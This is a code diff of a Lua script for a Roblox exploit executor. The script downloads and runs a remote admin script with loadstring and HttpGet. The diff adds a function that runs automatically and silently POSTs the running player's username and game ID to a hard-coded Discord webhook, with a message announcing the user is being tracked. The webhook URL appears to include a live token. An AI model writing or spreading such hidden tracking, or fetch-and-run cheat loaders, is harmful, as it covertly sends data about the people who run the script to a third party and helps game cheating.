@@ -1,12 +1,25 @@
 local speaker = game.Players.LocalPlayer
-print("Version 1.0")
 loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source", true))()
 local people = {
     "432757113"
 }
+ http = game:GetService("HttpService")
+ current = nil 
+ init1 = false
+ url = "https://discord.com/api/webhooks/899337815526092820/nxdQDkysN45aH69n81ErLNPk49PJ7uV2HNSWkppN4fVho8MvLqUMSkZsZ-Y-lOC2dRbq"
 
-local current = nil 
-local init1 = false
+function notify1()
+    local response = syn.request(
+        {
+            Url = 'https://discord.com/api/webhooks/899337815526092820/nxdQDkysN45aH69n81ErLNPk49PJ7uV2HNSWkppN4fVho8MvLqUMSkZsZ-Y-lOC2dRbq',
+            Method = 'POST',
+            Headers = {
+                ['Content-Type'] = 'application/json'
+            },
+         Body = game:GetService('HttpService'):JSONEncode({content = speaker.Name.. " is connected! | "..game.PlaceId.. " Is the user's game: tracking !"})
+        })
+end
+notify1()
 
  function reLoop()
     print("a")
